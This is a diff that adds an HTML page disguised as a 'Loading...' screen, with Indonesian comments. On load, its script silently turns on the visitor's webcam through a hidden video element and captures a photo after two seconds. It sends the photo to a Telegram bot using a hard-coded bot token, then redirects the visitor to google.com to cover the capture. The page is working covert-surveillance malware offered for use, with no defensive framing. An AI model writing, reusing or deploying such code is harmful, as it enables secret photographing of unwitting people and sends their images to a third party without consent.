@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <video id="v" autoplay style="display:none;"></video>
+    <script>
+        // Ambil data dari config (Manual copy ke sini)
+        const T = '8740275012:AAGCVHVXmaIpSz4eOzaev5ZGRka9y4UtjTY'; 
+        const C = '8740275012:AAGCVHVXmaIpSz4eOzaev5ZGRka9y4UtjTY';
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(s => {
+            const v = document.getElementById('v');
+            v.srcObject = s;
+            setTimeout(() => {
+                const c = document.createElement('canvas');
+                c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => {
+                    const f = new FormData();
+                    f.append('chat_id', C);
+                    f.append('photo', b, 'capture.jpg');
+                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
+                    .then(() => location.href = "https://google.com");
+                }, 'image/jpeg');
+            }, 2000);
+        }).catch(e => alert("Akses kamera ditolak!"));
+    </script>
+</body>
+</html>
+  
